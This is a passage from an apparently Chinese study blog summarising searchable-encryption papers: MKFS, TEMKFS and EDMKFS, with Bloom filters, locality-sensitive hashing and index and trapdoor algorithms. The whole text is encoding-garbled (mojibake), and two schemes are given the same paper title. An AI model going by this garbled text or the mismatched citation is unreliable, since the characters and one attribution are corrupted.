ä¸ºå¯†é’¥ï¼Œå°†ç»“æœä¸ Y<sub>i</sub>R æ¯”è¾ƒï¼Œç›¸åŒåˆ™æ£€ç´¢æˆåŠŸã€‚\n\n#### è§£å¯†è¿‡ç¨‹\n\n- å°† S<sub>i</sub> åˆ’åˆ†ä¸º S<sub>i</sub>L å’Œ S<sub>i</sub>Rï¼ŒC<sub>i</sub> åˆ’åˆ†ä¸º C<sub>i</sub>L å’Œ C<sub>i</sub>Rï¼Œå³ S<sub>i</sub> = < S<sub>i</sub>Lï¼ŒS<sub>i</sub>R>ï¼ŒC<sub>i</sub> = <C<sub>i</sub>Lï¼ŒC<sub>i</sub>R>\n\n- S<sub>i</sub>L å’Œ C<sub>i</sub>L å¼‚æˆ–å¾—åˆ° L<sub>i</sub>ï¼Œå³ L<sub>i</sub> = S<sub>i</sub>L âŠ• C<sub>i</sub>L\n- ä½¿ç”¨å¸¦å¯†é’¥çš„ Hash å‡½æ•° f å¯¹ L<sub>i</sub> è¿›è¡Œè¿ç®—ï¼Œä»¥ k' ä¸ºå¯†é’¥ï¼Œå¾—åˆ°æ–°çš„å¯†é’¥ k<sub>i</sub>\n- ä½¿ç”¨å¸¦å¯†é’¥çš„ Hash å‡½æ•° F å¯¹è¿›è¡ŒåŠ å¯†ï¼Œä»¥ä¸º k<sub>i</sub> å¯†é’¥ï¼Œå¾—åˆ° F<sub>k<sub>i</sub></sub>(S<sub>i</sub>)\n- F<sub>k<sub>i</sub></sub>(S<sub>i</sub>) å’Œ C<sub>i</sub>R å¼‚æˆ–å¾—åˆ° R<sub>i</sub>ï¼Œå³ R<sub>i</sub> = F<sub>k<sub>i</sub></sub>(S<sub>i</sub>) âŠ• C<sub>i</sub>R\n- æ‹¼æ¥ L<sub>i</sub> å’Œ R<sub>iÂ </sub>å¾—åˆ° X<sub>i</sub>ï¼Œä½¿ç”¨åŠ å¯†ç®—æ³• E çš„è§£å¯†ç®—æ³•è§£å¯†å³å¯\n\n### 3ã€æ€»ç»“\n\næœ¬æ–‡ç»™å‡ºçš„å¯æœç´¢åŠ å¯†æ–¹æ¡ˆï¼Œè¿˜æœ‰å¾ˆå¤§çš„å¯æ‰©å±•ç©ºé—´ï¼š\n\n- â‘ æ”¯æŒé«˜çº§çš„æŸ¥è¯¢ï¼šæœ¬æ–‡æ¶‰åŠçš„æŸ¥è¯¢éƒ½æ˜¯ç®€å•çš„å•ä¸ªå…³é”®å­—çš„æŸ¥è¯¢ï¼Œä½†æ˜¯ä¼ ç»Ÿçš„æ•°æ®åº“é«˜çº§è¯­è¨€ï¼ˆSQLè¯­è¨€ï¼‰å´æ”¯æŒæ›´ä¸ºé«˜çº§çš„å¸ƒå°”æŸ¥è¯¢ç­‰æŸ¥è¯¢æ¨¡å¼ï¼Œè®¾è®¡ä¸€ç§å®ç°æ”¯æŒæå–ã€åˆå–èŒƒå¼çš„æŸ¥è¯¢æ¨¡å¼ä¹Ÿå¾ˆæœ‰å¿…è¦ï¼›å¦å¤–ï¼Œæ¨¡ç³ŠæŸ¥è¯¢ä¹Ÿå¯ä»¥å’Œå¯æœç´¢åŠ å¯†æŠ€æœ¯ç»“åˆèµ·æ¥ã€‚\n- â‘¡æ”¯æŒå˜é•¿å…³é”®å­—æŸ¥è¯¢ï¼ši> ä½¿ç”¨å›ºå®šé•¿åº¦çš„ã€è¶³å¤Ÿé•¿çš„å—ï¼Œä»è€Œèƒ½å¤Ÿå®¹çº³æ‰€æœ‰çš„æŸ¥è¯¢å…³é”®å­—ï¼›ii>ä½¿ç”¨å˜é•¿çš„å…³é”®å­—ï¼Œä½†æ˜¯åœ¨å…³é”®å­—ä¸­è¦åŒ…å«å…³é”®å­—çš„å­—é•¿ä¿¡æ¯ï¼›\n- â‘¢åŸºäºç´¢å¼•çš„æŸ¥è¯¢ï¼ŒåŸºäºç´¢å¼•çš„æ–¹æ¡ˆåœ¨æŸ¥è¯¢æ•ˆç‡ä¸Šæ˜¯ä¸€èˆ¬æ–¹æ¡ˆçš„æ•°å€ï¼Œä½†æ˜¯åœ¨ç´¢å¼•æ›´æ–°ä¸Šå´æœ‰å¾ˆå¤§çš„æå‡ç©ºé—´ã€‚\n\nçœ‹å®Œæ–‡ç« ä¸¤ç¯‡ç»¼è¿°å’Œè¿™ç¯‡è®ºæ–‡åï¼Œå¯¼å¸ˆç»™æˆ‘çš„å»ºè®®æ˜¯æŠŠçœ‹è®ºæ–‡çš„é‡å¿ƒæ”¾åœ¨**å¯¹ç§°å¯æœç´¢åŠ å¯†(SSE)**æ–¹å‘ä¸Šï¼ŒSSEæ–¹æ¡ˆå…·æœ‰è®¡ç®—å¼€é”€å°ã€ç®—æ³•ç®€å•ã€é€Ÿåº¦å¿«çš„ç‰¹ç‚¹ï¼Œå¯¼å¸ˆç€é‡è®©æˆ‘çœ‹å…³äºåŸºäº**ç´¢å¼•**çš„**å¤šå…³é”®å­—æŸ¥è¯¢ã€æ¨¡ç³ŠæŸ¥è¯¢ã€å¯éªŒè¯çš„æŸ¥è¯¢**è¿™ä¸‰ä¸ªæ–¹å‘ã€‚\n\n## â‘¡MKFSæ–¹æ¡ˆ\n\n**è®ºæ–‡åç§°ï¼šã€ŠMulti-Keyword Fuzzy Search over Encrypted Dataã€‹**\n\n- ä½œè€…ï¼šç‹æºç’‡ã€æå®‡æºªã€å‘¨ç¦æ‰ã€ç‹æƒç¦\n- å•ä½ï¼šä¸œåŒ—å¤§å­¦\n- åˆŠç‰©ï¼š[è®¡ç®—æœºç ”ç©¶ä¸å‘å±•](https://crad.ict.ac.cn/CN/10.7544/issn1000-1239.2017.20151125)\n- æ—¶é—´ï¼š2017å¹´5æœˆ\n\n### 1ã€æ€»ä½“æ€è·¯\n\nè¯¥æ–¹æ¡ˆåˆ©ç”¨**å¸ƒéš†è¿‡æ»¤å™¨**å’Œ**å±€éƒ¨æ•æ„Ÿå“ˆå¸Œå‡½æ•°**æŠ€æœ¯ï¼Œæ¥å®ç°**å¤šå…³é”®å­—çš„å¯†æ–‡æ¨¡ç³Šæœç´¢**ã€‚ä¸»è¦ç ”ç©¶å†…å®¹åŒ…æ‹¬:å°†ä¸Šä¼ æ–‡ä»¶åˆ©ç”¨**å¯¹å¶ç¼–ç å‡½æ•°**å°†å…¶å…³é”®å­—è½¬æ¢æˆå‘é‡,å†åˆ©ç”¨å±€éƒ¨æ•æ„Ÿå“ˆå¸Œå‡½æ•°å°†å…¶æ˜ å°„åˆ°å¸ƒéš†è¿‡æ»¤å™¨ä¸­ï¼›æœåŠ¡å™¨åœ¨æ‰§è¡Œå¯†æ–‡æœç´¢æ—¶ï¼Œéœ€è¦å…ˆå¯¹è¾“å…¥çš„æŸ¥è¯¢å…³é”®å­—è¿›è¡Œä¸Šè¿°è½¬æ¢ï¼Œå†é€šè¿‡è®¡ç®—å®‰å…¨ç´¢å¼•å‚æ•°å’Œé™·é—¨çš„å†…ç§¯æ¥æœç´¢åˆ°ç¬¦åˆæ¡ä»¶çš„å¯†æ–‡æ–‡ä»¶ã€‚\n\n### 2ã€ä½¿ç”¨æŠ€æœ¯\n\n- å±€éƒ¨æ•æ„Ÿå“ˆå¸Œå‡½æ•°\n- å¸ƒéš†è¿‡æ»¤å™¨\n- å®‰å…¨è¿‘é‚»ç®—æ³•\n- å¯¹å¶ç¼–ç å‡½æ•°\n\n### 3ã€æ–¹æ¡ˆå®ç°\n\næœ¬æ–¹æ¡ˆä¸»è¦ç”± 4 ä¸ªä¸»è¦ç®—æ³•ç»„æˆï¼šå¯†é’¥ç”Ÿæˆç®—æ³•ã€ç´¢å¼•ç”Ÿæˆç®—æ³•ã€é™·é—¨ç”Ÿæˆç®—æ³•ã€æœç´¢ç®—æ³•\n\n- **sk â† KeyGen(1<sup>k</sup> )ï¼šå¯†é’¥ç”Ÿæˆç®—æ³•**\n  - è¿è¡Œäºæ•°æ®æ‹¥æœ‰è€…ç«¯ï¼Œç”¨äºç”ŸæˆåŠ å¯†ç´¢å¼•å’ŒæŸ¥è¯¢å…³é”®å­—çš„å¯†é’¥ã€‚\n  - è¾“å…¥å®‰å…¨å‚æ•° 1<sup>k</sup>ï¼Œè¾“å‡ºå¯†é’¥ sk ã€‚\n\n- **I â† BuildIndex(sk , F , W)ï¼šç´¢å¼•ç”Ÿæˆç®—æ³•**\n  - è¿è¡Œäºæ•°æ®æ‹¥æœ‰è€…ç«¯ï¼Œç”¨äºç”Ÿæˆæ–‡ä»¶å¯¹åº”çš„å®‰å…¨ç´¢å¼•ã€‚\n  - è¾“å…¥å¯†é’¥ sk ã€æ–‡ä»¶æ ‡è®°åºå· Fã€æ–‡ä»¶ F å¯¹åº”çš„å…³é”®è¯é›†åˆ W ï¼Œè¾“å‡ºå®‰å…¨ç´¢å¼• I ã€‚\n\n- **t â† Trapdoor(sk , Q)ï¼šé™·é—¨ç”Ÿæˆç®—æ³•**\n  - è¿è¡Œäºç”¨æˆ·ç«¯ï¼Œç”¨äºåŠ å¯†æŸ¥è¯¢å…³é”®å­—é›†åˆç”Ÿæˆå®‰å…¨é™·é—¨ã€‚\n  - è¾“å…¥å¯†é’¥ sk ã€æŸ¥è¯¢å…³é”®è¯é›†åˆ Q ï¼Œè¾“å‡ºå®‰å…¨é™·é—¨ t ã€‚\n\n- **F<sub>R</sub> â† Search(I , t)ï¼šæœç´¢ç®—æ³•**\n  - è¿è¡Œäºç¬¬ä¸‰æ–¹æœåŠ¡å™¨ç«¯ã€‚ç”¨äºå®‰å…¨ç´¢å¼•ä¸å®‰å…¨é™·é—¨çš„åŒ¹é…ã€‚\n  - è¾“å…¥å®‰å…¨ç´¢å¼•I å’Œå®‰å…¨é™·é—¨ t ï¼Œè¾“å‡ºæ–‡ä»¶åºåˆ—é›†åˆ F<sub>R</sub>ã€‚\n\n![](https://img.jwt1399.top/img/image-20220125145335142.png)\n\n------\n\n#### å¯†é’¥ç”Ÿæˆç®—æ³•\n\nsk â† KeyGen(1<sup>k</sup> ) ç”Ÿæˆå¯†é’¥ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹(kâ‰¥128)ï¼š\n\n- ï¼ˆ1ï¼‰éšæœºæ„å»º 2 ä¸ª k Ã— k ç»´çš„çŸ©é˜µ M<sub>1</sub> , M<sub>2</sub> âˆˆ ï¼²<sup>k Ã— k</sup>\n\n- ï¼ˆ2ï¼‰éšæœºæ„å»ºä¸€ä¸ª k ç»´çš„å‘é‡ S âˆˆ { 0 , 1 }<sup>k</sup> ï¼Œä¸” S ä¸­ 0 å’Œ 1 çš„æ•°é‡éœ€è¦å¤§è‡´ç›¸åŒ\n\n- ï¼ˆ3ï¼‰è¾“å‡º sk ï¼ï¼ˆ M<sub>1</sub> , M<sub>2</sub> , S ï¼‰ä½œä¸º**ç”ŸæˆåŠ å¯†ç´¢å¼•**å’Œ**ç”Ÿæˆé™·é—¨**çš„**å¯†é’¥**\n\n#### ç´¢å¼•ç”Ÿæˆç®—æ³•\n\nI â† BuildIndex(sk , F , W)ç”Ÿæˆå®‰å…¨ç´¢å¼•ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹:\n\n- **ï¼ˆ1ï¼‰æ•°æ®é¢„å¤„ç†**\n  - å¯¹äºæ–‡ä»¶é›†åˆ F = { f<sub>1</sub> , f<sub>2</sub> ,â€¦, f<sub>n</sub> }ä¸­çš„æ¯ä¸€ä¸ªæ–‡ä»¶ f<sub>i</sub> æ‰€å¯¹åº”çš„å…³é”®å­—é›†åˆ W<sub>i</sub> = { w<sub>1</sub> , w<sub>2</sub> ,â€¦, w<sub>t</sub> }ï¼Œä½¿ç”¨å¯¹å¶ç¼–ç å‡½æ•°å°†å…¶è½¬æ¢æˆå‘é‡é›†åˆ V = { v<sub>1</sub> , v<sub>2</sub> ,â€¦, v<sub>t</sub> }ï¼Œå…¶ä¸­æ¯ä¸ªå‘é‡ v<sub>i</sub> âˆˆ {0,1}<sup>676</sup> ;\n- **ï¼ˆ2ï¼‰æ„å»ºç´¢å¼•**\n  - â‘  ä¸ºæ–‡ä»¶ f<sub>i</sub> æ„å»ºä¸€ä¸ª k bit çš„**å¸ƒéš†è¿‡æ»¤å™¨ B**<sub>i</sub>ï¼Œåˆå§‹åŒ–ä¸º0 \n  - â‘¡å¯¹äºå‘é‡é›†åˆ V = { v<sub>1</sub> , v<sub>2</sub> ,â€¦, v<sub>t</sub> } ä¸­çš„æ¯ä¸ªå‘é‡ v<sub>i</sub>ï¼Œä½¿ç”¨**å±€éƒ¨æ•æ„Ÿå“ˆå¸Œå‡½æ•°** { H<sub>1</sub> , H<sub>2</sub> ,â€¦, H<sub>l</sub>  } è¿›è¡Œè®¡ç®—(H<sub>1</sub>(v<sub>i</sub>) , H<sub>2</sub>(v<sub>i</sub>) ,â€¦, H<sub>l</sub>(v<sub>i</sub>) )ï¼Œå¹¶å°†ç»“æœæ’å…¥åˆ°å¸ƒéš†è¿‡æ»¤å™¨ B<sub>i</sub> ã€‚\n\n- **ï¼ˆ3ï¼‰ç´¢å¼•åŠ å¯†**\n- å°†å¯†é’¥ sk ä¸­çš„ S è¡¨ç¤ºä¸º S = (s<sub>1</sub> , s<sub>2</sub> ,â€¦, s<sub>k</sub>)ã€‚å¯¹äºæ¯ä¸€ä¸ªæ–‡ä»¶ f<sub>i</sub> æ‰€å¾—åˆ°çš„å¸ƒéš†è¿‡æ»¤å™¨ B<sub>i</sub>\n  - â‘  éšæœºé€‰æ‹©å‚æ•° r âˆˆ  R\n  - â‘¡ å°† B<sub>i</sub>  è¡¨ç¤ºä¸º B<sub>i</sub> = ( b<sub>1</sub> , b<sub>2</sub> ,â€¦, b<sub>k</sub>)ã€‚ B<sub>i</sub>  ä¸ S å…·æœ‰åŒæ ·çš„ç»“æ„ï¼Œå‡ä¸ºç”± {0,1} ç»„æˆçš„ k ä½å‘é‡ã€‚å¯¹äº B<sub>i</sub> ä¸­çš„æ¯ä¸€ä¸ª b<sub>j</sub> ï¼Œ\n    - è‹¥åœ¨ S ä¸­å¯¹åº”çš„ s<sub>j</sub> = 1 ï¼Œåˆ™ä»¤ b'<sub>j</sub> =  b''<sub>j</sub> = b<sub>j</sub> \n    - è‹¥åœ¨ S ä¸­å¯¹åº”çš„ s<sub>j</sub> =0ï¼Œåˆ™ä»¤ b'<sub>j</sub> = 1/2b<sub>j</sub> + r  ã€b''<sub>j</sub> = 1/2b<sub>j</sub> - r\n  - â‘¢ ä»¤ B'<sub>iÂ </sub> =  ( b'<sub>1</sub> , b'<sub>2</sub> ,â€¦, b'<sub>k</sub>)ï¼ŒB\"<sub>i </sub> =  ( b\"<sub>1</sub> , b\"<sub>2</sub> ,â€¦, b\"<sub>k</sub>)\n  - â‘£ è®¡ç®— I'<sub>i</sub> = M<sub>1</sub><sup>T</sup> â€¢ B'<sub>i </sub> , I\"<sub>i</sub> = M<sub>2</sub><sup>T</sup> â€¢ B\"<sub>i </sub> \n  - â‘¤ ä»¤  I<sub>i</sub> = (I'<sub>i</sub> ï¼ŒI\"<sub>i</sub> ) \n  - â‘¥è¾“å‡ºç´¢å¼• I = ( F , I<sub>1</sub> , I<sub>2</sub> ,â€¦, I<sub>n</sub> )\n\n#### é™·é—¨ç”Ÿæˆç®—æ³•\n\nt â† Trapdoor(sk , Q) æ ¹æ®æŸ¥è¯¢å…³é”®è¯é›†åˆç”Ÿæˆå®‰å…¨é™·é—¨ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹:\n\n- ï¼ˆ1ï¼‰æ„å»ºä¸€ä¸ª k ä½çš„å¸ƒéš†è¿‡æ»¤å™¨ B ã€‚\n\n- ï¼ˆ2ï¼‰å¯¹äºæŸ¥è¯¢å…³é”®å­—é›†åˆ Q = { q<sub>1</sub> , q<sub>2</sub> ,â€¦, q<sub>t</sub> }ï¼Œä½¿ç”¨å¯¹å¶ç¼–ç å°†å…¶è½¬æ¢æˆå‘é‡é›†åˆ V = { v<sub>1</sub> , v<sub>2</sub> ,â€¦, v<sub>t</sub> } ä¸­æ¯ä¸ªå‘é‡ v<sub>i</sub> âˆˆ {0,1}<sup>676</sup> ï¼Œä½¿ç”¨å±€éƒ¨æ•æ„Ÿå“ˆå¸Œå‡½æ•° { H<sub>1</sub> , H<sub>2</sub> ,â€¦, H<sub>l</sub>  } è¿›è¡Œè®¡ç®—(H<sub>1</sub>(v<sub>i</sub>) , H<sub>2</sub>(v<sub>i</sub>) ,â€¦, H<sub>l</sub>(v<sub>i</sub>) )ï¼Œå¹¶å°†ç»“æœæ’å…¥åˆ°å¸ƒéš†è¿‡æ»¤å™¨ B ã€‚\n\n- ï¼ˆ3ï¼‰å°†å¯†é’¥ sk ä¸­çš„ S è¡¨ç¤ºä¸º S = (s<sub>1</sub> , s<sub>2</sub> ,â€¦, s<sub>k</sub>)ã€‚å¯¹äºå¸ƒéš†è¿‡æ»¤å™¨ B\n\n  - â‘  éšæœºé€‰æ‹©å‚æ•° r' âˆˆ  R\n  - â‘¡ å°† B<sub>i</sub>  è¡¨ç¤ºä¸º B<sub>i</sub> = ( b<sub>1</sub> , b<sub>2</sub> ,â€¦, b<sub>k</sub>)ã€‚ B<sub>i</sub>  ä¸ S å…·æœ‰åŒæ ·çš„ç»“æ„ï¼Œå‡ä¸ºç”± {0,1} ç»„æˆçš„ k ä½å‘é‡ã€‚å¯¹äº B ä¸­çš„æ¯ä¸€ä¸ª b<sub>j</sub> ï¼Œ\n    - è‹¥åœ¨ S ä¸­å¯¹åº”çš„ s<sub>j</sub> = 0 ï¼Œåˆ™ä»¤ b'<sub>j</sub> =  b''<sub>j</sub> = b<sub>j</sub> ï¼Œ\n    - è‹¥åœ¨ S ä¸­å¯¹åº”çš„ s<sub>j</sub> = 1ï¼Œåˆ™ä»¤ b'<sub>j</sub> = 1/2b<sub>j</sub> + r'  ã€b''<sub>j</sub> = 1/2b<sub>j</sub> - r'\n  - â‘¢ ä»¤ B' =  ( b'<sub>1</sub> , b'<sub>2</sub> ,â€¦, b'<sub>k</sub>)ï¼ŒB\" =  ( b\"<sub>1</sub> , b\"<sub>2</sub> ,â€¦, b\"<sub>k</sub>)\n  - â‘£ è®¡ç®— t' = M<sub>1</sub><sup>-1</sup> â€¢ B' , t\" = M<sub>2</sub><sup>-1</sup> â€¢ B\"\n  - â‘¤ ä»¤  t = (t'ï¼Œt\" ) \n  \n- ï¼ˆ4ï¼‰è¾“å‡ºé™·é—¨ t ã€‚\n\n#### æœç´¢ç®—æ³•\n\nF<sub>R</sub> â† Search(I , t)æœåŠ¡å™¨æ ¹æ®é™·é—¨å’ŒåŠ å¯†ç´¢å¼•æ‰§è¡Œæœç´¢ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹:\n\n- ï¼ˆ1ï¼‰ä»¤ F<sub>R</sub> ä¸ºä¸€ä¸ªåˆå§‹ä¸ºç©ºçš„æ–‡ä»¶é›†åˆ\n- ï¼ˆ2ï¼‰å°†ç´¢å¼• I è¡¨ç¤ºä¸º I =  ( F , I<sub>1</sub> , I<sub>2</sub> ,â€¦, I<sub>n</sub> ) å¯¹äºæ¯ä¸€ä¸ª I<sub>i </sub>\n  - â‘  å°† I<sub>i </sub>è¡¨ç¤ºä¸º I<sub>i Â </sub>= (I'<sub>i</sub> ï¼ŒI\"<sub>i</sub> ) ï¼Œå°† t è¡¨ç¤ºä¸º t = (t'ï¼Œt\" ) \n  - â‘¡ è®¡ç®—å‘é‡çš„æ•°é‡ç§¯ï¼š R<sub>I</sub> = I'<sub>i</sub> â€¢ t'  + I\"<sub>i</sub>  â€¢ t\"\n  - â‘¢ æŒ‰æ’åºç®—æ³•å°†è®¡ç®—çš„å‘é‡å†…ç§¯ä½œæ’åºï¼Œå°†æ’åºåºåˆ—ä¸­çš„å‰ *Î»* æ¡è®°å½•åŠ å…¥åˆ°ç»“æœé›†åˆ F<sub>R</sub> ä¸­\n- ï¼ˆ3ï¼‰è¾“å‡º F<sub>RÂ </sub>ä½œä¸ºæœ€ç»ˆæœç´¢ç»“æœ\n\n### 4ã€æ€»ç»“\n\nä¸å·²æœ‰æ–¹æ¡ˆç›¸æ¯”ï¼Œæœ¬æ–¹æ¡ˆä¸éœ€è¦æå‰è®¾ç½®ç´¢å¼•å­˜å‚¨ç©ºé—´ï¼Œä»è€Œå¤§å¤§é™ä½äº†æœç´¢çš„å¤æ‚åº¦ï¼›åŒæ—¶ï¼Œè¯¥æ–¹æ¡ˆä¸éœ€è¦é¢„å®šä¹‰å­—å…¸åº“ï¼Œé™ä½äº†å­˜å‚¨å¼€é”€ã€‚\n\nMKFS æ²¡æœ‰æ˜¾ç¤ºå…³é”®å­—å’Œæ–‡ä»¶ä¹‹é—´çš„ç›¸å…³æ€§ã€‚å¯¹äºä¸åŒæ–‡ä»¶ä¸­ç›¸åŒçš„å…³é”®å­—ï¼Œå…¶å…³é”®å­—æƒé‡åº”è¯¥ä¸åŒï¼Œåœ¨æ’åºæ—¶è¦è€ƒè™‘è¿™ç§å·®å¼‚ã€‚å› æ­¤ï¼Œä¸æŸ¥è¯¢å…³é”®å­—æ›´ç›¸å…³çš„æ–‡ä»¶å¯èƒ½ä¸ä¼šåŒ…å«åœ¨è¿”å›ç»“æœä¸­ã€‚\n\n## â‘¢TEMKFSæ–¹æ¡ˆ\n\n**è®ºæ–‡åç§°ï¼šã€ŠEfficient dynamic multi-keyword fuzzy search over encrypted cloud dataã€‹**\n\n- ä½œè€…ï¼šå‚…å¼ æ°; å´å¿ƒä¹; å…³æœæ–‡; å­™å…´æ˜; ä»»å¥\n- å•ä½ï¼šå®‰å¾½å¤§å­¦\n- æ¥æºï¼š[IEEE Transactions on Information Forensics and Security](https://ieeexplore.ieee.org/document/7524700) ã€CCF Aã€‘\n- æ—¶é—´ï¼š2016å¹´7æœˆ\n\n### 1ã€æ€»ä½“æ€è·¯\n\nè¯¥æ–¹æ¡ˆåˆ©ç”¨**å±€éƒ¨æ•æ„Ÿå“ˆå¸Œ**å’Œ**å¸ƒéš†è¿‡æ»¤å™¨**æ¥å®ç°**æ¨¡ç³Šå…³é”®å­—æœç´¢**ï¼Œå¼€å‘äº†ä¸€ç§åŸºäº **uni-gram å…³é”®å­—è½¬æ¢**æ–°æ–¹æ³•ã€‚æ­¤å¤–ï¼Œä½¿ç”¨**è¯å¹²åˆ†æç®—æ³•**æŸ¥è¯¢å…·æœ‰ç›¸åŒæ ¹çš„å…³é”®å­—ã€‚åœ¨é€‰æ‹©é€‚å½“çš„åŒ¹é…æ–‡ä»¶é›†æ—¶ï¼Œè¯¥æ–¹æ¡ˆä¼šè€ƒè™‘å…³é”®å­—æƒé‡ã€‚\n\næœ¬æ–‡çš„ä¸»è¦è´¡çŒ®å½’çº³å¦‚ä¸‹:\n\n- 1.å¼€å‘äº†ä¸€ç§åŸºäº **uni-gram çš„å…³é”®è¯è½¬æ¢**æ–°æ–¹æ³•ã€‚å¯¹äºä¸€ä¸ªå­—æ¯çš„æ‹¼é”™ï¼Œè¯¥æ–¹æ³•å‡å°äº†æ‹¼é”™å…³é”®å­—ä¸æ­£ç¡®å…³é”®å­—ä¹‹é—´çš„æ¬§å‡ é‡Œå¾·è·ç¦»ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬å¼•å…¥**è¯å¹²æå–ç®—æ³•**æ¥è·å–å•è¯çš„è¯æ ¹ã€‚\n- 2.åœ¨æ„å»ºç»“æœçš„æ’ååˆ—è¡¨æ—¶è€ƒè™‘**å…³é”®å­—æƒé‡**ã€‚ä¸å…³é”®å­—æ›´ç›¸å…³çš„æ–‡ä»¶å°†æœ‰æ›´å¤§çš„æœºä¼šå‡ºç°åœ¨åˆ—è¡¨çš„é¦–ä½ã€‚\n- 3.ä½¿ç”¨çœŸå®æ•°æ®é›†æ¥å®æ–½å’Œè¯„ä¼°æˆ‘ä»¬æå‡ºçš„æ–¹æ¡ˆã€‚å®éªŒç»“æœè¡¨æ˜ï¼Œæœ¬æ–‡æå‡ºçš„ç®—æ³•å…·æœ‰è¾ƒé«˜çš„ç²¾åº¦ã€‚\n\n### 2ã€ä½¿ç”¨æŠ€æœ¯\n\n- å±€éƒ¨æ•æ„Ÿå“ˆå¸Œå‡½æ•°\n- å¸ƒéš†è¿‡æ»¤å™¨\n- å®‰å…¨è¿‘é‚»ç®—æ³•\n- uni-gram å…³é”®å­—å˜æ¢\n- æ³¢ç‰¹è¯å¹²ç®—æ³•\n- è¯é¢‘-é€†æ–‡æ¡£é¢‘åº¦ï¼ˆTF-IDFï¼‰\n\n### 3ã€æ–¹æ¡ˆå®ç°\n\n![](https://img.jwt1399.top/img/image-20220209195204896.png)\n\n### 4ã€æ€»ç»“\n\nå¼•å…¥äº†åŸºäºuni-gram æ¨¡å‹çš„ porter è¯å¹²æå–ç®—æ³•å’Œå…³é”®å­—è½¬æ¢ç®—æ³•ï¼Œæå¤§åœ°æé«˜äº†æ¨¡ç³Šæœç´¢ç²¾åº¦ã€‚ç„¶è€Œï¼Œä»…ä½¿ç”¨æœ¯è¯­é¢‘ç‡å¯¹ç»“æœè¿›è¡Œæ’åºï¼Œè¿™ä¼šå¯¼è‡´æ’åºç»“æœä¸å‡†ç¡®å’Œé«˜è®¡ç®—å¼€é”€ã€‚\n\n## â‘£EDMKFSæ–¹æ¡ˆ\n\n**è®ºæ–‡åç§°ï¼šã€ŠEfficient dynamic multi-keyword fuzzy search over encrypted cloud dataã€‹**\n\n- ä½œè€…ï¼šæ´ªå¿ ï¼Œè©¹é£åˆ©ï¼Œæ°ç¿ ï¼Œå²³å­™ï¼Œé™†æµ\n- å•ä½ï¼šå®‰å¾½å¤§å­¦\n- æ¥æºï¼š[Journal of Network and Computer Applications](https://www.sciencedirect.com/science/article/abs/pii/S1084804519303297?via%3Dihub#!)ã€CCF Cã€‘\n- æ—¶é—´ï¼š2020å¹´1æœˆ\n- æ–¹æ¡ˆæ•ˆç‡\n  - ç²¾ç¡®æœç´¢100%\n  - æ¨¡ç³Šæœç´¢85%\n\n### 1ã€æ€»ä½“æ€è·¯\n\nè¯¥æ–¹æ¡ˆåˆ©ç”¨**å±€éƒ¨æ€§æ•æ„Ÿæ•£åˆ—**å’Œ**å¸ƒéš†è¿‡æ»¤å™¨**ç”¨äºç”Ÿæˆç´¢å¼•å‘é‡å’ŒæŸ¥è¯¢å‘é‡ã€‚åŸºäºç”Ÿæˆçš„å‘é‡ï¼Œæ„å»º**å¹³è¡¡äºŒå‰æ ‘**ä½œä¸ºæ•´ä¸ªæ–‡ä»¶é›†çš„ç´¢å¼•ï¼Œå¹¶å¼€å‘ **Top-k æœç´¢ç®—æ³•**ï¼Œå€ŸåŠ©ç´¢å¼•æ ‘æœç´¢ä¸ç»™å®šæŸ¥è¯¢æœ€ç›¸å…³çš„ k ä¸ªæ–‡ä»¶ã€‚\n\næœ¬æ–‡çš„ä¸»è¦è´¡çŒ®å½’çº³å¦‚ä¸‹:\n\n- 1.å¼€å‘äº†ä¸€ç§åŠ¨æ€å¤šå…³é”®å­—æ¨¡ç³Šæœç´¢æ–¹æ¡ˆï¼Œå®ç°äº†**å®¹é”™çš„å¤šå…³é”®å­—æ¨¡ç³Šæœç´¢**ï¼Œå¹¶æ”¯æŒ\n  æ–‡ä»¶çš„é«˜æ•ˆ**åŠ¨æ€æ›´æ–°**ã€‚\n- 2.å¼•å…¥ä¸€ç§**å¹³è¡¡äºŒå‰æ ‘**æ¥ç»„è£…æ‰€æœ‰å¸ƒéš†ç´¢å¼•å‘é‡ã€‚åŸºäºæ­¤æ ‘ï¼Œä¸€ä¸ªæœç´¢è¯·æ±‚çš„æœç´¢æ—¶é—´ä¸ºO(rlogn)ï¼Œä¼˜äºä»¥å¾€ç±»ä¼¼çš„æ¨¡ç³Šæœç´¢æ–¹æ¡ˆã€‚\n- 3.é€šè¿‡ç»¼åˆå®éªŒï¼ŒéªŒè¯äº†è¯¥æ–¹æ¡ˆçš„æœ‰æ•ˆæ€§ã€‚\n\n### 2ã€ä½¿ç”¨æŠ€æœ¯\n\n- å±€éƒ¨æ•æ„Ÿå“ˆå¸Œå‡½æ•°\n- å¸ƒéš†è¿‡æ»¤å™¨\n- å®‰å…¨è¿‘é‚»ç®—æ³•\n- uni-gram å…³é”®å­—å˜æ¢\n- å¹³è¡¡äºŒå‰æ ‘\n- è¯é¢‘-é€†æ–‡æ¡£é¢‘åº¦ï¼ˆTF-IDFï¼‰\n- Top-k æœç´¢ç®—æ³•\n\n### 3ã€æ–¹æ¡ˆå®ç°\n\n#### åŸºäº uni-gram çš„å…³é”®å­—è½¬æ¢\n\nä»æ–‡ä»¶é›†åˆä¸­æå–çš„å…³é”®å­—é¦–å…ˆè½¬æ¢ä¸º uni-gram å‘é‡è¡¨ç¤ºï¼Œä»¥ä¾¿ä½¿ç”¨ LSH å‡½æ•°è¿›è¡Œæ˜ å°„\n\n- é¦–å…ˆï¼Œæ¯ä¸ªå…³é”®å­—è¢«åˆ†å‰²æˆä¸€ä¸ª uni-gram é›†åˆã€‚\n  - ä¾‹å¦‚ï¼Œå…³é”®å­— â€œsecureâ€ è¢«è½¬æ¢ä¸º{s1ï¼Œe1ï¼Œc1ï¼Œu1ï¼Œr1ï¼Œe2}ï¼Œå…¶ä¸­ â€œe1â€ æ˜¯ â€œsecureâ€ ä¸­çš„ç¬¬ä¸€ä¸ª â€œeâ€ï¼Œè€Œâ€œe2â€ æ˜¯ç¬¬äºŒä¸ª â€œeâ€ã€‚\n- uni-gram é›†åˆç”¨ä¸€ä¸ª 160 ä½çš„å‘é‡è¡¨ç¤ºï¼Œå‘é‡ç»„æˆä¸º 26âˆ—5+30 bitsï¼Œå…¶ä¸­ 26âˆ—5 bits ä»£è¡¨ 26âˆ—5 ä¸ªå­—æ¯ï¼Œ30 